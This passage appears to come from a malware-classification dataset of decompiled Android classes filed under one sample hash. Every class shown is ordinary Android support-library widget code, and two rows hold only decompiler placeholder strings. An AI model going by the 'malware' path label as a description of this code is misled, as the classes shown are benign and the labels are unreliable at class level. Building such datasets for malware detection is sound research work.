ContentLoadingProgressBar.this.mPostedShow=false;         if (!ContentLoadingProgressBar.this.mDismissed) {           ContentLoadingProgressBar.this.mStartTime=System.currentTimeMillis();           ContentLoadingProgressBar.this.setVisibility(0);         }       }     } ;   }   @Override public void onAttachedToWindow(){     super.onAttachedToWindow();     removeCallbacks();   }   @Override public void onDetachedFromWindow(){     super.onDetachedFromWindow();     removeCallbacks();   }   private void removeCallbacks(){     removeCallbacks(this.mDelayedHide);     removeCallbacks(this.mDelayedShow);   }   public void hide(){     this.mDismissed=true;     removeCallbacks(this.mDelayedShow);     long diff=System.currentTimeMillis() - this.mStartTime;     if (diff >= 500 || this.mStartTime == -1) {       setVisibility(8);     }  else     if (!this.mPostedHide) {       postDelayed(this.mDelayedHide,500 - diff);       this.mPostedHide=true;     }   }   public void show(){     this.mStartTime=-1L;     this.mDismissed=false;     removeCallbacks(this.mDelayedHide);     if (!this.mPostedShow) {       postDelayed(this.mDelayedShow,500L);       this.mPostedShow=true;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\CursorAdapter.code","public abstract class CursorAdapter extends BaseAdapter implements CursorFilter.CursorFilterClient, Filterable {   @Deprecated public static final int FLAG_AUTO_REQUERY=1;   public static final int FLAG_REGISTER_CONTENT_OBSERVER=2;   protected boolean mAutoRequery;   protected ChangeObserver mChangeObserver;   protected Context mContext;   protected Cursor mCursor;   protected CursorFilter mCursorFilter;   protected DataSetObserver mDataSetObserver;   protected boolean mDataValid;   protected FilterQueryProvider mFilterQueryProvider;   protected int mRowIDColumn;   public abstract void bindView(  View view,  Context context,  Cursor cursor);   public abstract View newView(  Context context,  Cursor cursor,  ViewGroup viewGroup);   @Deprecated public CursorAdapter(  Context context,  Cursor c){     init(context,c,1);   }   public CursorAdapter(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   public CursorAdapter(  Context context,  Cursor c,  int flags){     init(context,c,flags);   }   @Deprecated protected void init(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   void init(  Context context,  Cursor c,  int flags){     if ((flags & 1) == 1) {       flags|=2;       this.mAutoRequery=true;     }  else {       this.mAutoRequery=false;     }     boolean cursorPresent=c != null;     this.mCursor=c;     this.mDataValid=cursorPresent;     this.mContext=context;     this.mRowIDColumn=cursorPresent ? c.getColumnIndexOrThrow(""_id"") : -1;     if ((flags & 2) == 2) {       this.mChangeObserver=new ChangeObserver();       this.mDataSetObserver=new MyDataSetObserver();     }  else {       this.mChangeObserver=null;       this.mDataSetObserver=null;     }     if (cursorPresent) {       if (this.mChangeObserver != null) {         c.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         c.registerDataSetObserver(this.mDataSetObserver);       }     }   }   @Override public Cursor getCursor(){     return this.mCursor;   }   @Override public int getCount(){     if (!this.mDataValid || this.mCursor == null) {       return 0;     }     return this.mCursor.getCount();   }   @Override public Object getItem(  int position){     if (!this.mDataValid || this.mCursor == null) {       return null;     }     this.mCursor.moveToPosition(position);     return this.mCursor;   }   @Override public long getItemId(  int position){     if (this.mDataValid && this.mCursor != null && this.mCursor.moveToPosition(position)) {       return this.mCursor.getLong(this.mRowIDColumn);     }     return 0L;   }   @Override public boolean hasStableIds(){     return true;   }   @Override public View getView(  int position,  View convertView,  ViewGroup parent){     View v;     if (!this.mDataValid) {       throw new IllegalStateException(""this should only be called when the cursor is valid"");     }     if (!this.mCursor.moveToPosition(position)) {       throw new IllegalStateException(""couldn't move cursor to position "" + position);     }     if (convertView == null) {       v=newView(this.mContext,this.mCursor,parent);     }  else {       v=convertView;     }     bindView(v,this.mContext,this.mCursor);     return v;   }   @Override public View getDropDownView(  int position,  View convertView,  ViewGroup parent){     View v;     if (this.mDataValid) {       this.mCursor.moveToPosition(position);       if (convertView == null) {         v=newDropDownView(this.mContext,this.mCursor,parent);       }  else {         v=convertView;       }       bindView(v,this.mContext,this.mCursor);       return v;     }     return null;   }   public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return newView(context,cursor,parent);   }   @Override public void changeCursor(  Cursor cursor){     Cursor old=swapCursor(cursor);     if (old != null) {       old.close();     }   }   public Cursor swapCursor(  Cursor newCursor){     if (newCursor == this.mCursor) {       return null;     }     Cursor oldCursor=this.mCursor;     if (oldCursor != null) {       if (this.mChangeObserver != null) {         oldCursor.unregisterContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         oldCursor.unregisterDataSetObserver(this.mDataSetObserver);       }     }     this.mCursor=newCursor;     if (newCursor != null) {       if (this.mChangeObserver != null) {         newCursor.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         newCursor.registerDataSetObserver(this.mDataSetObserver);       }       this.mRowIDColumn=newCursor.getColumnIndexOrThrow(""_id"");       this.mDataValid=true;       notifyDataSetChanged();       return oldCursor;     }     this.mRowIDColumn=-1;     this.mDataValid=false;     notifyDataSetInvalidated();     return oldCursor;   }   @Override public CharSequence convertToString(  Cursor cursor){     return cursor == null ? """" : cursor.toString();   }   @Override public Cursor runQueryOnBackgroundThread(  CharSequence constraint){     return this.mFilterQueryProvider != null ? this.mFilterQueryProvider.runQuery(constraint) : this.mCursor;   }   @Override public Filter getFilter(){     if (this.mCursorFilter == null) {       this.mCursorFilter=new CursorFilter(this);     }     return this.mCursorFilter;   }   public FilterQueryProvider getFilterQueryProvider(){     return this.mFilterQueryProvider;   }   public void setFilterQueryProvider(  FilterQueryProvider filterQueryProvider){     this.mFilterQueryProvider=filterQueryProvider;   }   protected void onContentChanged(){     if (this.mAutoRequery && this.mCursor != null && !this.mCursor.isClosed()) {       this.mDataValid=this.mCursor.requery();     }   } public class ChangeObserver extends ContentObserver {     public ChangeObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       CursorAdapter.this.onContentChanged();     }   } public class MyDataSetObserver extends DataSetObserver {     private MyDataSetObserver(){     }     @Override public void onChanged(){       CursorAdapter.this.mDataValid=true;       CursorAdapter.this.notifyDataSetChanged();     }     @Override public void onInvalidated(){       CursorAdapter.this.mDataValid=false;       CursorAdapter.this.notifyDataSetInvalidated();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\CursorFilter.code","class CursorFilter extends Filter {   CursorFilterClient mClient; interface CursorFilterClient {     void changeCursor(    Cursor cursor);     CharSequence convertToString(    Cursor cursor);     Cursor getCursor();     Cursor runQueryOnBackgroundThread(    CharSequence charSequence);   }   public CursorFilter(  CursorFilterClient client){     this.mClient=client;   }   @Override public CharSequence convertResultToString(  Object resultValue){     return this.mClient.convertToString((Cursor)resultValue);   }   @Override protected Filter.FilterResults performFiltering(  CharSequence constraint){     Cursor cursor=this.mClient.runQueryOnBackgroundThread(constraint);     Filter.FilterResults results=new Filter.FilterResults();     if (cursor != null) {       results.count=cursor.getCount();       results.values=cursor;     }  else {       results.count=0;       results.values=null;     }     return results;   }   @Override protected void publishResults(  CharSequence constraint,  Filter.FilterResults results){     Cursor oldCursor=this.mClient.getCursor();     if (results.values != null && results.values != oldCursor) {       this.mClient.changeCursor((Cursor)results.values);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\CursorFilterClient.code","interface CursorFilterClient {   void changeCursor(  Cursor cursor);   CharSequence convertToString(  Cursor cursor);   Cursor getCursor();   Cursor runQueryOnBackgroundThread(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\CursorToStringConverter.code","public interface CursorToStringConverter {   CharSequence convertToString(  Cursor cursor); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\DisableLayerRunnable.code","public class DisableLayerRunnable implements Runnable {   final View mChildView;   DisableLayerRunnable(  View childView){     this.mChildView=childView;   }   @Override public void run(){     if (this.mChildView.getParent() == SlidingPaneLayout.this) {       ViewCompat.setLayerType(this.mChildView,0,null);       SlidingPaneLayout.this.invalidateChildRegion(this.mChildView);     }     SlidingPaneLayout.this.mPostedRunnables.remove(this);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\DragHelperCallback.code","private class DragHelperCallback extends ViewDragHelper.Callback {   private DragHelperCallback(){   }   @Override public boolean tryCaptureView(  View child,  int pointerId){     if (SlidingPaneLayout.this.mIsUnableToDrag) {       return false;     }     return ((LayoutParams)child.getLayoutParams()).slideable;   }   @Override public void onViewDragStateChanged(  int state){     if (SlidingPaneLayout.this.mDragHelper.getViewDragState() == 0) {       if (SlidingPaneLayout.this.mSlideOffset == 0.0f) {         SlidingPaneLayout.this.updateObscuredViewsVisibility(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.dispatchOnPanelClosed(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.mPreservedOpenState=false;       }  else {         SlidingPaneLayout.this.dispatchOnPanelOpened(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.mPreservedOpenState=true;       }     }   }   @Override public void onViewCaptured(  View capturedChild,  int activePointerId){     SlidingPaneLayout.this.setAllChildrenVisible();   }   @Override public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){     SlidingPaneLayout.this.onPanelDragged(left);     SlidingPaneLayout.this.invalidate();   }   @Override public void onViewReleased(  View releasedChild,  float xvel,  float yvel){     LayoutParams lp=(LayoutParams)releasedChild.getLayoutParams();     int left=SlidingPaneLayout.this.getPaddingLeft() + lp.leftMargin;     if (xvel > 0.0f || (xvel == 0.0f && SlidingPaneLayout.this.mSlideOffset > 0.5f)) {       left+=SlidingPaneLayout.this.mSlideRange;     }     SlidingPaneLayout.this.mDragHelper.settleCapturedViewAt(left,releasedChild.getTop());     SlidingPaneLayout.this.invalidate();   }   @Override public int getViewHorizontalDragRange(  View child){     return SlidingPaneLayout.this.mSlideRange;   }   @Override public int clampViewPositionHorizontal(  View child,  int left,  int dx){     LayoutParams lp=(LayoutParams)SlidingPaneLayout.this.mSlideableView.getLayoutParams();     int leftBound=SlidingPaneLayout.this.getPaddingLeft() + lp.leftMargin;     int rightBound=leftBound + SlidingPaneLayout.this.mSlideRange;     int newLeft=Math.min(Math.max(left,leftBound),rightBound);     return newLeft;   }   @Override public void onEdgeDragStarted(  int edgeFlags,  int pointerId){     SlidingPaneLayout.this.mDragHelper.captureChildView(SlidingPaneLayout.this.mSlideableView,pointerId);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\DrawerLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@19a2dad8"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\DrawerListener.code","public interface DrawerListener {   void onDrawerClosed(  View view);   void onDrawerOpened(  View view);   void onDrawerSlide(  View view,  float f);   void onDrawerStateChanged(  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\EdgeEffectCompat.code","public class EdgeEffectCompat {   private static final EdgeEffectImpl IMPL;   private Object mEdgeEffect; interface EdgeEffectImpl {     boolean draw(    Object obj,    Canvas canvas);     void finish(    Object obj);     boolean isFinished(    Object obj);     Object newEdgeEffect(    Context context);     boolean onAbsorb(    Object obj,    int i);     boolean onPull(    Object obj,    float f);     boolean onRelease(    Object obj);     void setSize(    Object obj,    int i,    int i2);   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new EdgeEffectIcsImpl();     }  else {       IMPL=new BaseEdgeEffectImpl();     }   } static class BaseEdgeEffectImpl implements EdgeEffectImpl {     BaseEdgeEffectImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return null;     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){     }     @Override public boolean isFinished(    Object edgeEffect){       return true;     }     @Override public void finish(    Object edgeEffect){     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return false;     }     @Override public boolean onRelease(    Object edgeEffect){       return false;     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return false;     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return false;     }   } static class EdgeEffectIcsImpl implements EdgeEffectImpl {     EdgeEffectIcsImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return EdgeEffectCompatIcs.newEdgeEffect(context);     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){       EdgeEffectCompatIcs.setSize(edgeEffect,width,height);     }     @Override public boolean isFinished(    Object edgeEffect){       return EdgeEffectCompatIcs.isFinished(edgeEffect);     }     @Override public void finish(    Object edgeEffect){       EdgeEffectCompatIcs.finish(edgeEffect);     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);     }     @Override public boolean onRelease(    Object edgeEffect){       return EdgeEffectCompatIcs.onRelease(edgeEffect);     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return EdgeEffectCompatIcs.draw(edgeEffect,canvas);     }   }   public EdgeEffectCompat(  Context context){     this.mEdgeEffect=IMPL.newEdgeEffect(context);   }   public void setSize(  int width,  int height){     IMPL.setSize(this.mEdgeEffect,width,height);   }   public boolean isFinished(){     return IMPL.isFinished(this.mEdgeEffect);   }   public void finish(){     IMPL.finish(this.mEdgeEffect);   }   public boolean onPull(  float deltaDistance){     return IMPL.onPull(this.mEdgeEffect,deltaDistance);   }   public boolean onRelease(){     return IMPL.onRelease(this.mEdgeEffect);   }   public boolean onAbsorb(  int velocity){     return IMPL.onAbsorb(this.mEdgeEffect,velocity);   }   public boolean draw(  Canvas canvas){     return IMPL.draw(this.mEdgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\EdgeEffectCompatIcs.code","class EdgeEffectCompatIcs {   EdgeEffectCompatIcs(){   }   public static Object newEdgeEffect(  Context context){     return new EdgeEffect(context);   }   public static void setSize(  Object edgeEffect,  int width,  int height){     ((EdgeEffect)edgeEffect).setSize(width,height);   }   public static boolean isFinished(  Object edgeEffect){     return ((EdgeEffect)edgeEffect).isFinished();   }   public static void finish(  Object edgeEffect){     ((EdgeEffect)edgeEffect).finish();   }   public static boolean onPull(  Object edgeEffect,  float deltaDistance){     ((EdgeEffect)edgeEffect).onPull(deltaDistance);     return true;   }   public static boolean onRelease(  Object edgeEffect){     EdgeEffect eff=(EdgeEffect)edgeEffect;     eff.onRelease();     return eff.isFinished();   }   public static boolean onAbsorb(  Object edgeEffect,  int velocity){     ((EdgeEffect)edgeEffect).onAbsorb(velocity);     return true;   }   public static boolean draw(  Object edgeEffect,  Canvas canvas){     return ((EdgeEffect)edgeEffect).draw(canvas);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\EdgeEffectIcsImpl.code","static class EdgeEffectIcsImpl implements EdgeEffectImpl {   EdgeEffectIcsImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return EdgeEffectCompatIcs.newEdgeEffect(context);   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){     EdgeEffectCompatIcs.setSize(edgeEffect,width,height);   }   @Override public boolean isFinished(  Object edgeEffect){     return EdgeEffectCompatIcs.isFinished(edgeEffect);   }   @Override public void finish(  Object edgeEffect){     EdgeEffectCompatIcs.finish(edgeEffect);   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);   }   @Override public boolean onRelease(  Object edgeEffect){     return EdgeEffectCompatIcs.onRelease(edgeEffect);   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return EdgeEffectCompatIcs.draw(edgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\EdgeEffectImpl.code","interface EdgeEffectImpl {   boolean draw(  Object obj,  Canvas canvas);   void finish(  Object obj);   boolean isFinished(  Object obj);   Object newEdgeEffect(  Context context);   boolean onAbsorb(  Object obj,  int i);   boolean onPull(  Object obj,  float f);   boolean onRelease(  Object obj);   void setSize(  Object obj,  int i,  int i2); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ExploreByTouchHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4cbcb937"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ExploreByTouchNodeProvider.code","private class ExploreByTouchNodeProvider extends AccessibilityNodeProviderCompat {   private ExploreByTouchNodeProvider(){   }   @Override public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return ExploreByTouchHelper.this.createNode(virtualViewId);   }   @Override public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return ExploreByTouchHelper.this.performAction(virtualViewId,action,arguments);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\KitKatListPopupWindowImpl.code","static class KitKatListPopupWindowImpl extends BaseListPopupWindowImpl {   KitKatListPopupWindowImpl(){   }   @Override public View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return ListPopupWindowCompatKitKat.createDragToOpenListener(listPopupWindow,src);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\KitKatPopupMenuImpl.code","static class KitKatPopupMenuImpl extends BasePopupMenuImpl {   KitKatPopupMenuImpl(){   }   @Override public View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return PopupMenuCompatKitKat.getDragToOpenListener(popupMenu);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\LayoutParams.code","public static class LayoutParams extends ViewGroup.MarginLayoutParams {   public int gravity;   boolean isPeeking;   boolean knownOpen;   float onScreen;   public LayoutParams(  Context c,  AttributeSet attrs){     super(c,attrs);     this.gravity=0;     TypedArray a2=c.obtainStyledAttributes(attrs,DrawerLayout.LAYOUT_ATTRS);     this.gravity=a2.getInt(0,0);     a2.recycle();   }   public LayoutParams(  int width,  int height){     super(width,height);     this.gravity=0;   }   public LayoutParams(  int width,  int height,  int gravity){     this(width,height);     this.gravity=gravity;   }   public LayoutParams(  LayoutParams source){     super((ViewGroup.MarginLayoutParams)source);     this.gravity=0;     this.gravity=source.gravity;   }   public LayoutParams(  ViewGroup.LayoutParams source){     super(source);     this.gravity=0;   }   public LayoutParams(  ViewGroup.MarginLayoutParams source){     super(source);     this.gravity=0;   } } public static class LayoutParams extends ViewGroup.MarginLayoutParams {   private static final int[] ATTRS={R.attr.layout_weight};   Paint dimPaint;   boolean dimWhenOffset;   boolean slideable;   public float weight;   public LayoutParams(){     super(-1,-1);     this.weight=0.0f;   }   public LayoutParams(  int width,  int height){     super(width,height);     this.weight=0.0f;   }   public LayoutParams(  ViewGroup.LayoutParams source){     super(source);     this.weight=0.0f;   }   public LayoutParams(  ViewGroup.MarginLayoutParams source){     super(source);     this.weight=0.0f;   }   public LayoutParams(  LayoutParams source){     super((ViewGroup.MarginLayoutParams)source);     this.weight=0.0f;     this.weight=source.weight;   }   public LayoutParams(  Context c,  AttributeSet attrs){     super(c,attrs);     this.weight=0.0f;     TypedArray a2=c.obtainStyledAttributes(attrs,ATTRS);     this.weight=a2.getFloat(0,0.0f);     a2.recycle();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ListPopupWindowCompat.code","public class ListPopupWindowCompat {   static final ListPopupWindowImpl IMPL; interface ListPopupWindowImpl {     View.OnTouchListener createDragToOpenListener(    Object obj,    View view);   } static class BaseListPopupWindowImpl implements ListPopupWindowImpl {     BaseListPopupWindowImpl(){     }     @Override public View.OnTouchListener createDragToOpenListener(    Object listPopupWindow,    View src){       return null;     }   } static class KitKatListPopupWindowImpl extends BaseListPopupWindowImpl {     KitKatListPopupWindowImpl(){     }     @Override public View.OnTouchListener createDragToOpenListener(    Object listPopupWindow,    View src){       return ListPopupWindowCompatKitKat.createDragToOpenListener(listPopupWindow,src);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatListPopupWindowImpl();     }  else {       IMPL=new BaseListPopupWindowImpl();     }   }   private ListPopupWindowCompat(){   }   public static View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return IMPL.createDragToOpenListener(listPopupWindow,src);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ListPopupWindowCompatKitKat.code","class ListPopupWindowCompatKitKat {   ListPopupWindowCompatKitKat(){   }   public static View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return ((ListPopupWindow)listPopupWindow).createDragToOpenListener(src);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ListPopupWindowImpl.code","interface ListPopupWindowImpl {   View.OnTouchListener createDragToOpenListener(  Object obj,  View view); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ListViewAutoScrollHelper.code","public class ListViewAutoScrollHelper extends AutoScrollHelper {   private final ListView mTarget;   public ListViewAutoScrollHelper(  ListView target){     super(target);     this.mTarget=target;   }   @Override public void scrollTargetBy(  int deltaX,  int deltaY){     View firstView;     ListView target=this.mTarget;     int firstPosition=target.getFirstVisiblePosition();     if (firstPosition != -1 && (firstView=target.getChildAt(0)) != null) {       int newTop=firstView.getTop() - deltaY;       target.setSelectionFromTop(firstPosition,newTop);     }   }   @Override public boolean canTargetScrollHorizontally(  int direction){     return false;   }   @Override public boolean canTargetScrollVertically(  int direction){     ListView target=this.mTarget;     int itemCount=target.getCount();     int childCount=target.getChildCount();     int firstPosition=target.getFirstVisiblePosition();     int lastPosition=firstPosition + childCount;     if (direction > 0) {       if (lastPosition >= itemCount) {         View lastView=target.getChildAt(childCount - 1);         if (lastView.getBottom() <= target.getHeight()) {           return false;         }       }     }  else {       if (direction >= 0) {         return false;       }       if (firstPosition <= 0) {         View firstView=target.getChildAt(0);         if (firstView.getTop() >= 0) {           return false;         }       }     }     return true;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\MyDataSetObserver.code","public class MyDataSetObserver extends DataSetObserver {   private MyDataSetObserver(){   }   @Override public void onChanged(){     CursorAdapter.this.mDataValid=true;     CursorAdapter.this.notifyDataSetChanged();   }   @Override public void onInvalidated(){     CursorAdapter.this.mDataValid=false;     CursorAdapter.this.notifyDataSetInvalidated();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\MySearchView.code","public static class MySearchView extends SearchView {   public MySearchView(  Context context){     super(context);   }   @Override public void onActionViewCollapsed(){     setQuery("""",false);     super.onActionViewCollapsed();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\OnCloseListenerCompat.code","public static abstract class OnCloseListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnCloseListener(this);   public boolean onClose(){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\OnCloseListenerCompatBridge.code","interface OnCloseListenerCompatBridge {   boolean onClose(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\OnQueryTextListenerCompat.code","public static abstract class OnQueryTextListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);   public boolean onQueryTextSubmit(  String query){     return false;   }   public boolean onQueryTextChange(  String newText){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\OnQueryTextListenerCompatBridge.code","interface OnQueryTextListenerCompatBridge {   boolean onQueryTextChange(  String str);   boolean onQueryTextSubmit(  String str); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\PanelSlideListener.code","public interface PanelSlideListener {   void onPanelClosed(  View view);   void onPanelOpened(  View view);   void onPanelSlide(  View view,  float f); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\PopupMenuCompat.code","public class PopupMenuCompat {   static final PopupMenuImpl IMPL; interface PopupMenuImpl {     View.OnTouchListener getDragToOpenListener(    Object obj);   } static class BasePopupMenuImpl implements PopupMenuImpl {     BasePopupMenuImpl(){     }     @Override public View.OnTouchListener getDragToOpenListener(    Object popupMenu){       return null;     }   } static class KitKatPopupMenuImpl extends BasePopupMenuImpl {     KitKatPopupMenuImpl(){     }     @Override public View.OnTouchListener getDragToOpenListener(    Object popupMenu){       return PopupMenuCompatKitKat.getDragToOpenListener(popupMenu);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatPopupMenuImpl();     }  else {       IMPL=new BasePopupMenuImpl();     }   }   private PopupMenuCompat(){   }   public static View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return IMPL.getDragToOpenListener(popupMenu);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\PopupMenuCompatKitKat.code","class PopupMenuCompatKitKat {   PopupMenuCompatKitKat(){   }   public static View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return ((PopupMenu)popupMenu).getDragToOpenListener();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\PopupMenuImpl.code","interface PopupMenuImpl {   View.OnTouchListener getDragToOpenListener(  Object obj); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.widget\ResourceCursorAdapter.code","public abstract class ResourceCursorAdapter extends CursorAdapter {   private int mDropDownLayout;   private LayoutInflater mInflater;   private int mLayout;   @Deprecated public ResourceCursorAdapter(  Context context,  int layout,  Cursor c){     super(context,c);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  boolean autoRequery){     super(context,c,autoRequery);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  int flags){     super(context,c,flags);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   @Override public View newView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mLayout,parent,false);   }   @Override public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mDropDownLayout,parent,false);   }   public void setViewResource(  int layout){     this.mLayout=layout;   }   public void setDropDownViewResource(  int dropDownLayout){     this.mDropDownLayout=dropDownLayout;   } } "
